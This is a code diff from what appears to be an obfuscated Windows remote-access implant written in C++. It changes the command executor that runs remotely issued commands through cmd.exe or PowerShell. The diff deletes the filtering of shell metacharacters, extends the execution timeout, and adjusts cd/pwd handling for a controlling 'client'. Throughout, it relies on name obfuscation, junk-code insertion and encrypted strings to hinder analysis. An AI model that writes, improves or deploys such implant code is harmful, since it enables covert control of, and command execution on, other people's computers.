@@ -85,19 +85,9 @@ bool CommandExecutor::OBF_FUNC_NAME(is_powershell_command)(const std::string& co
 }
 
 std::string CommandExecutor::OBF_FUNC_NAME(sanitize_command)(const std::string& command) {
-    std::string sanitized = command;
-
-    // Remove potentially dangerous sequences (basic sanitization)
-    std::vector<std::string> dangerous = {"&", "|", ">", "<", "^"};
-    for (const auto& danger : dangerous) {
-        size_t pos = 0;
-        while ((pos = sanitized.find(danger, pos)) != std::string::npos) {
-            sanitized.replace(pos, danger.length(), "");
-            pos += 1;
-        }
-    }
-
-    return sanitized;
+    // No sanitization - let cmd.exe handle command parsing
+    // This allows legitimate redirection (>, <, |, &) and other shell features
+    return command;
 }
 
 std::string CommandExecutor::OBF_FUNC_NAME(execute_with_createprocess)(const std::string& cmd_line) {
@@ -151,7 +141,7 @@ std::string CommandExecutor::OBF_FUNC_NAME(execute_with_createprocess)(const std
         obf::insert_junk_code();
     }
 
-    WaitForSingleObject(pi.hProcess, 5000); // 5 second timeout
+    WaitForSingleObject(pi.hProcess, 30000); // 30 second timeout
     CloseHandle(hRead);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
@@ -205,25 +195,41 @@ std::string CommandExecutor::execute(const std::string& command) {
 
     obf::insert_junk_code();
 
-    // Check for special commands
-    if (command == "pwd" || command == "cd") {
+    // Check for pwd command (with or without && suffix)
+    if (command == "pwd" || command.substr(0, 4) == "pwd " || command.substr(0, 7) == "pwd && ") {
+        return get_current_directory();
+    }
+
+    // Check for cd command (bare cd or cd with path)
+    if (command == "cd" || command == "cd && cd") {
         return get_current_directory();
     }
 
     if (command.substr(0, 3) == "cd ") {
         std::string path = command.substr(3);
-        return change_directory(path) ?
-            SUCCESS_PREFIX.decrypt() + "Directory changed" :
-            ERROR_PREFIX.decrypt() + "Failed to change directory";
+        // Extract path up to && if present (client appends "&& cd" for tracking)
+        size_t and_pos = path.find("&&");
+        if (and_pos != std::string::npos) {
+            path = path.substr(0, and_pos);
+            // Trim trailing whitespace
+            while (!path.empty() && (path.back() == ' ' || path.back() == '\t')) {
+                path.pop_back();
+            }
+        }
+        if (change_directory(path)) {
+            return get_current_directory();
+        } else {
+            return ERROR_PREFIX.decrypt() + "Failed to change directory";
+        }
     }
 
-    if (command == "ps" || command == "tasklist") {
-        return list_processes();
-    }
+    //if (command == "ps" || command == "tasklist") {
+    //   return list_processes();
+    //}
 
-    if (command == "sysinfo" || command == "systeminfo") {
-        return get_system_info();
-    }
+    //if (command == "sysinfo" || command == "systeminfo") {
+    //    return get_system_info();
+    //}
 
     // Execute based on command type
     if (OBF_FUNC_NAME(is_powershell_command)(command)) {
